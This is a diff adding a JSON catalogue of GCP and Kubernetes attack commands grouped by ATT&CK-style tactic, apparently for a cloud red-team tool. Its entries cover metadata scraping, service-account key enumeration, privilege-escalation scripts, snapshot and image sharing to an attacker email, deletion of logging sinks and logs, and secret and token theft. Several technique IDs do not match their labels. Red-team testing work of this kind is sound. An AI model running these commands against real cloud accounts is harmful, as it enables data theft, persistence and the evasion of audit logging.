@@ -1,0 +1,98 @@
+{
+    "GCP": {
+        "Reconnaissance": [
+            {"id": "T1590-1", "details": "Gathering GCP resources", "command": "gcloud compute instances list"},
+            {"id": "T1590-2", "details": "Analyzing gcloud configuration", "command": "gcloud info --quiet; gcloud config list --quiet; gcloud auth list --quiet"},
+            {"id": "T1590-3", "details": "Scraping metadata server", "command": "curl 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text' -H 'Metadata-Flavor: Google'"},
+            {"id": "T1590-4", "details": "Exporting detailed compute instance info", "command": "gcloud compute instances list --quiet --format=json"},
+            {"id": "T1590-5", "details": "Exporting detailed firewall info", "command": "gcloud compute firewall-rules list --quiet --format=json"},
+            {"id": "T1590-6", "details": "Exporting detailed subnets info", "command": "gcloud compute networks subnets list --quiet --format=json"},
+            {"id": "T1590-7", "details": "Exporting detailed service account info", "command": "gcloud iam service-accounts list --quiet --format=json"},
+            {"id": "T1590-8", "details": "Exporting detailed service account key info", "command": "for i in $(gcloud iam service-accounts list --format='table[no-heading](email)'); do gcloud iam service-accounts keys list --quiet --iam-account $i --quiet --format=json; done"},
+            {"id": "T1590-9", "details": "Exporting detailed project IAM info", "command": "gcloud projects get-iam-policy $(curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id -s) --quiet --format=json"},
+            {"id": "T1590-10", "details": "Exporting detailed organization IAM info", "command": "for i in $(gcloud organizations list | awk '{print $2}' | tail -n +2); do gcloud organizations get-iam-policy $i --quiet; done"},
+            {"id": "T1590-11", "details": "Exporting detailed available project info", "command": "gcloud projects list --quiet --format=json"},
+            {"id": "T1590-12", "details": "Exporting detailed instance template info", "command": "gcloud compute instance-templates list --quiet --format=json"},
+            {"id": "T1590-13", "details": "Exporting detailed custom image info", "command": "gcloud compute images list --no-standard-images --quiet --format=json"},
+            {"id": "T1590-14", "details": "Exporting detailed Cloud Functions info", "command": "gcloud functions list --quiet --format=json"},
+            {"id": "T1590-15", "details": "Exporting detailed Pub/Sub info", "command": "gcloud pubsub subscriptions list --quiet --format=json"},
+            {"id": "T1590-16", "details": "Exporting detailed compute backend info", "command": "gcloud compute backend-services list --quiet --format=json"},
+            {"id": "T1590-17", "details": "Exporting detailed Cloud Run info", "command": "gcloud run services list --platform=managed --quiet --format=json; gcloud run services list --platform=gke --quiet --format=json"},
+            {"id": "T1590-18", "details": "Exporting detailed AI platform info", "command": "gcloud ai-platform models list --quiet --format=json; gcloud ai-platform jobs list --quiet --format=json"},
+            {"id": "T1590-19", "details": "Exporting detailed Cloud Source Repository info", "command": "gcloud source repos list --quiet --format=json"},
+            {"id": "T1590-20", "details": "Exporting detailed Cloud SQL info", "command": "gcloud sql instances list --quiet --format=json; for i in $(gcloud sql instances list --quiet | awk '{print $1}' | tail -n +2); do gcloud sql databases list --instance $i --quiet; done"},
+            {"id": "T1590-21", "details": "Exporting detailed Cloud Spanner info", "command": "gcloud spanner instances list --quiet --format=json; for i in $(gcloud spanner instances list --quiet | awk '{print $1}' | tail -n +2); do gcloud spanner databases list --quiet --instance $i; done"},
+            {"id": "T1590-22", "details": "Exporting detailed Cloud Bigtable info", "command": "gcloud bigtable instances list --quiet --format=json"},
+            {"id": "T1590-23", "details": "Exporting detailed Cloud Filestore info", "command": "gcloud filestore instances list --quiet --format=json"},
+            {"id": "T1590-24", "details": "Exporting Stackdriver logging info", "command": "gcloud logging logs list --quiet --format json; for i in $(gcloud logging logs list --quiet --format='table[no-heading](.)'); do gcloud logging read $i --quiet --format=json; done"},
+            {"id": "T1590-25", "details": "Exporting Kubernetes info", "command": "gcloud container clusters list --quiet --format json; gcloud container images list --quiet --format json"},
+            {"id": "T1590-26", "details": "Enumerating storage buckets", "command": "gsutil ls; gsutil ls -L; for i in $(gsutil ls); do gsutil ls $i; done"},
+            {"id": "T1590-27", "details": "Enumerating crypto keys", "command": "gcloud kms keyrings list --location global --quiet; for i in $(gcloud kms keyrings list --location global --quiet); do gcloud kms keys list --keyring $i --location global --quiet; done"}
+        ],
+        "Initial Access": [
+            {"id": "T1078", "details": "Using valid accounts", "command": "gcloud auth activate-service-account --key-file"},
+            {"id": "T1078-cloudbuild", "details": "Create Cloud Build", "command": "python3 scripts/ExploitScripts/cloudbuild.builds.create.py --project <PROJECT_ID> --trigger-id <TRIGGER_ID> --repo-name <REPO_NAME> --branch-name <BRANCH_NAME>"}
+        ],
+        "Execution": [
+            {"id": "T1059", "details": "Command and Scripting Interpreter", "command": "gcloud compute ssh instance-name --command <command>"}
+        ],
+        "Privilege Escalation": [
+            {"id": "T1068", "details": "Exploit Vulnerability", "command": "python3 scripts/ExploitScripts/compute.instances.create.py --token <TOKEN>"},
+            {"id": "T1078-priv", "details": "Valid Accounts - Privilege Escalation", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.getAccessToken.py --key-file <KEY_FILE>"},
+            {"id": "T1110-imp", "details": "Implicit Delegation", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.implicitDelegation.py --key-file <KEY_FILE>"},
+            {"id": "T1550-signBlob", "details": "Sign Blob - Access Token", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py --key-file <KEY_FILE>"},
+            {"id": "T1550-signBlobUrl", "details": "Sign Blob - GCS Signed URL", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py --key-file <KEY_FILE>"},
+            {"id": "T1552-signJWT", "details": "Sign JWT", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.signJWT.py --key-file <KEY_FILE>"}
+        ],
+        "Persistence": [
+            {"id": "T1500", "details": "Deploy Service", "command": "python3 scripts/ExploitScripts/deploymentmanager.deployments.create.py --config deploymentmanager.deployments.create-config.yaml"},
+            {"id": "T1500-func", "details": "Deploy Cloud Function", "command": "python3 scripts/ExploitScripts/cloudfunctions.functions.create-call.py --project <PROJECT_ID> --function <FUNCTION_NAME>"},
+            {"id": "T1136", "details": "Create Service Account", "command": "python3 scripts/ExploitScripts/iam.serviceAccounts.create.py --account-name <ACCOUNT_NAME> --project <PROJECT_ID>"},
+            {"id": "T1136-update", "details": "Update Role", "command": "python3 scripts/ExploitScripts/iam.roles.update.py --role-name <ROLE_NAME> --permissions <PERMISSIONS>"},
+            {"id": "T1098", "details": "Set Organization Policy", "command": "python3 scripts/ExploitScripts/orgpolicy.policy.set.py --policy <POLICY>"},
+            {"id": "T1505-run", "details": "Create Cloud Run Service", "command": "python3 scripts/ExploitScripts/run.services.create.py --service-name <SERVICE_NAME> --image <IMAGE>"},
+            {"id": "T1505-apiKey", "details": "Create API Key", "command": "python3 scripts/ExploitScripts/serviceusage.apiKeys.create.py --project <PROJECT_ID>"},
+            {"id": "T1505-listApiKeys", "details": "List API Keys", "command": "python3 scripts/ExploitScripts/serviceusage.apiKeys.list.py --project <PROJECT_ID>"},
+            {"id": "T1505-hmacKey", "details": "Create HMAC Key", "command": "python3 scripts/ExploitScripts/storage.hmacKeys.create.py --project <PROJECT_ID> --service-account <SERVICE_ACCOUNT>"},
+            {"id": "T1102-invite", "details": "Invite an External User to a GCP Project", "command": "gcloud projects add-iam-policy-binding [PROJECT_ID] --member='user:[USER_EMAIL]' --role='roles/[ROLE_NAME]'"}
+        ],
+        "Exfiltration": [
+            {"id": "T1567-1", "details": "Exfiltrate Compute Disk by Sharing It", "command": "gcloud compute snapshots create stolen-snapshot --source-disk https://www.googleapis.com/compute/v1/projects/<victim-project>/zones/<zone>/disks/<victim-disk> --source-disk-zone <zone>; gcloud compute snapshots add-iam-policy-binding stolen-snapshot --member='user:<email attack>' --role='roles/compute.storageAdmin'"},
+            {"id": "T1567-2", "details": "Exfiltrate Compute Image by Sharing It", "command": "gcloud compute images create stolen-image --source-disk https://www.googleapis.com/compute/v1/projects/<victim-project>/zones/<zone>/disks/<victim-disk> --source-disk-zone <zone>; gcloud compute images add-iam-policy-binding stolen-image --member='user:<email attack>' --role='roles/compute.imageUser'"},
+            {"id": "T1567-3", "details": "Exfiltrate Compute Disk by Sharing a Snapshot", "command": "gcloud compute snapshots create stolen-snapshot --source-disk https://www.googleapis.com/compute/v1/projects/<victim-project>/zones/<zone>/disks/<victim-disk> --source-disk-zone <zone>; gcloud compute snapshots add-iam-policy-binding stolen-snapshot --member='user:<email attack>' --role='roles/compute.storageAdmin'"}
+        ],
+        "Defense Evasion": [
+            {"id": "T1078-de", "details": "Abuse Elevation Control Mechanism", "command": "gcloud projects add-iam-policy-binding [PROJECT_ID] --member='serviceAccount:service-account@project.iam.gserviceaccount.com' --role='roles/owner'"},
+            {"id": "T1562", "details": "Impair Defenses", "command": "gcloud logging sinks delete my-sink"},
+            {"id": "T1564", "details": "Modify Cloud Compute Infrastructure", "command": "gcloud compute instances set-machine-type instance-name --machine-type n1-standard-1"},
+            {"id": "T1561", "details": "Modify Authentication Process", "command": "gcloud projects add-iam-policy-binding [PROJECT_ID] --member='user:attacker@example.com' --role='roles/editor'"},
+            {"id": "T1070", "details": "Hide Artifacts", "command": "gcloud logging logs delete my-log"}
+        ],
+        "Credential Access": [
+            {"id": "T1555", "details": "Credentials from Password Stores", "command": "gcloud secrets versions access latest --secret=[SECRET_NAME]"},
+            {"id": "T1528", "details": "Steal Application Access Token", "command": "gcloud auth print-access-token"},
+            {"id": "T1078-ca", "details": "Exploitation for Credential Access", "command": "gcloud projects get-iam-policy [PROJECT_ID] --flatten='bindings[].members' --format='table(bindings.role)'"}
+        ],
+        "Lateral Movement": [
+            {"id": "T1078-lm", "details": "Use Alternate Authentication Material", "command": "gcloud auth activate-service-account --key-file=[KEY_FILE]"},
+            {"id": "T1021", "details": "Remote Services", "command": "gcloud compute ssh [INSTANCE_NAME]"},
+            {"id": "T1078-sdt", "details": "Software Deployment Tools", "command": "gcloud deployment-manager deployments create deployment-name --config=config.yaml"}
+        ],
+        "Collection": [
+            {"id": "T1119", "details": "Automated Collection", "command": "gsutil cp gs://[BUCKET_NAME]/*.log ."},
+            {"id": "T1213", "details": "Data from Cloud Storage", "command": "gsutil ls gs://[BUCKET_NAME]"},
+            {"id": "T1213-ir", "details": "Data from Information Repositories", "command": "gcloud sql export sql-instance gs://bucket/file.sql --database=my-database"}
+        ]
+    },
+    "Kubernetes": {
+        "Reconnaissance": [
+            {"id": "T1602", "details": "Gathering Kubernetes resources", "command": "kubectl get pods --all-namespaces"}
+        ],
+        "Initial Access": [
+            {"id": "T1078.004", "details": "Using Kubernetes valid accounts", "command": "kubectl auth can-i"}
+        ],
+        "Execution": [
+            {"id": "T1059.007", "details": "Kubernetes Command and Scripting Interpreter", "command": "kubectl exec -it pod-name -- /bin/sh"}
+        ]
+    }
+}
